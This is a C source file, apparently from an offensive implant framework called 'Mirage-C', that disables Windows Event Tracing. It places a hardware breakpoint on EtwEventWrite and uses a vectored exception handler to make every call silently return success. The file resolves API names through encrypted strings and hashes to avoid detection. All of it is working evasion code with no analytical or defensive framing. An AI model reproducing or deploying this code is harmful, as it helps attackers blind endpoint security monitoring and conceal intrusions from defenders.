/*
 * etw_bypass.c — ETW bypass for Mirage-C
 *
 * Hardware breakpoint technique: sets DR0 on EtwEventWrite,
 * installs a VEH that intercepts execution and returns
 * STATUS_SUCCESS (0) without patching .text section.
 */

#include "etw_bypass.h"
#include "config.h"
#include "engine.h"

#ifdef ENABLE_ETW_BYPASS
#include "peb.h"
#include "export_resolve.h"
#include "hash.h"
#include "nt_types.h"
#include "mirage_asm.h"
#include "enc_strings.h"
#include <string.h>

/* ── CONTEXT offsets for x64 ──────────────────────────────── */

#define CTX_RAX   0x078
#define CTX_RSP   0x098
#define CTX_RIP   0x0f8
#define CTX_DR0   0x048
#define CTX_DR7   0x070

#ifndef EXCEPTION_SINGLE_STEP
#define EXCEPTION_SINGLE_STEP  0x80000004
#endif
#ifndef EXCEPTION_CONTINUE_EXECUTION
#define EXCEPTION_CONTINUE_EXECUTION (-1)
#endif

#define DR7_ENABLE_DR0_EXE  0x0000000000000001ULL

/* ── Function pointer types ───────────────────────────────── */

typedef void* (WINAPI *pRtlAddVectoredExceptionHandler)(ULONG, void *);
typedef ULONG (WINAPI *pRtlRemoveVectoredExceptionHandler)(void *);

/* ── State ────────────────────────────────────────────────── */

static void *g_etw_write = NULL;
static void *g_veh_handle = NULL;
static pRtlRemoveVectoredExceptionHandler g_fnRemoveVEH = NULL;

/* ── VEH handler ──────────────────────────────────────────── */

static LONG CALLBACK etw_veh_handler(EXCEPTION_POINTERS *ep) {
    if (ep->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP)
        return 0;

    DWORD64 *ctx = (DWORD64 *)ep->ContextRecord;
    DWORD64 rip = ctx[CTX_RIP / 8];

    if ((void *)rip != g_etw_write)
        return 0;

    DWORD64 rsp = ctx[CTX_RSP / 8];
    DWORD64 ret_addr = *(DWORD64 *)rsp;

    ctx[CTX_RIP / 8] = ret_addr;
    ctx[CTX_RSP / 8] = rsp + 8;
    ctx[CTX_RAX / 8] = 0; /* STATUS_SUCCESS */

    return EXCEPTION_CONTINUE_EXECUTION;
}

/* ── Helper ───────────────────────────────────────────────── */

static void* resolve_func(void* mod, const char* name) {
    uint32_t h = mirage_encrypted_hash_func(name);
    return mirage_get_function_by_hash(mod, h);
}

/* ── Cleanup ──────────────────────────────────────────────── */

static void etw_cleanup(void) {
    if (g_veh_handle && g_fnRemoveVEH) {
        g_fnRemoveVEH(g_veh_handle);
        g_veh_handle = NULL;
    }
    if (g_etw_write) {
        CONTEXT ctx;
        memset(&ctx, 0, sizeof(ctx));
        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
        NTSTATUS st = NtGetContextThread_stub(
            (uint64_t)(HANDLE)(intptr_t)(-2), (uint64_t)&ctx);
        if (st >= 0) {
            *(DWORD64 *)((char *)&ctx + CTX_DR0) = 0;
            *(DWORD64 *)((char *)&ctx + CTX_DR7) = 0;
            NtSetContextThread_stub(
                (uint64_t)(HANDLE)(intptr_t)(-2), (uint64_t)&ctx);
        }
        g_etw_write = NULL;
    }
}

/* ── mirage_patch_etw ─────────────────────────────────────── */

int mirage_patch_etw(void) {
    char ntdll_name[32]; enc_decrypt(enc_ntdll, ENC_NTDLL_LEN, ntdll_name);
    void* ntdll = mirage_get_module_by_hash(
        mirage_encrypted_hash_module(ntdll_name));
    if (!ntdll) return 0;

    /* Resolve EtwEventWrite (fallback to EtwEventWriteEx) */
    char etw_fn[32]; enc_decrypt(enc_EtwEventWrite, ENC_ETWEVENTWRITE_LEN, etw_fn);
    void* etw_write = resolve_func(ntdll, etw_fn);
    if (!etw_write) {
        char etw_fn_ex[32]; enc_decrypt(enc_EtwEventWriteEx, ENC_ETWEVENTWRITEEX_LEN, etw_fn_ex);
        etw_write = resolve_func(ntdll, etw_fn_ex);
    }
    if (!etw_write) return 0;

    /* Resolve VEH functions */
    char veh_add[64]; enc_decrypt(enc_RtlAddVectoredExceptionHandler, ENC_RTLADDVECTOREDEXCEPTIONHANDLER_LEN, veh_add);
    pRtlAddVectoredExceptionHandler fnAddVEH =
        (pRtlAddVectoredExceptionHandler)resolve_func(ntdll, veh_add);
    char veh_rem[64]; enc_decrypt(enc_RtlRemoveVectoredExceptionHandler, ENC_RTLREMOVEVECTOREDEXCEPTIONHANDLER_LEN, veh_rem);
    g_fnRemoveVEH = (pRtlRemoveVectoredExceptionHandler)resolve_func(ntdll, veh_rem);
    if (!fnAddVEH || !g_fnRemoveVEH) return 0;

    /* Install VEH */
    g_veh_handle = fnAddVEH(1, etw_veh_handler);
    if (!g_veh_handle) return 0;

    /* Set DR0 = EtwEventWrite address */
    CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    NTSTATUS st = NtGetContextThread_stub(
        (uint64_t)(HANDLE)(intptr_t)(-2), (uint64_t)&ctx);
    if (st < 0) { etw_cleanup(); return 0; }

    *(DWORD64 *)((char *)&ctx + CTX_DR0) = (DWORD64)etw_write;
    *(DWORD64 *)((char *)&ctx + CTX_DR7) = DR7_ENABLE_DR0_EXE;

    st = NtSetContextThread_stub(
        (uint64_t)(HANDLE)(intptr_t)(-2), (uint64_t)&ctx);
    if (st < 0) { etw_cleanup(); return 0; }

    g_etw_write = etw_write;
    return 1;
}

#endif /* ENABLE_ETW_BYPASS */
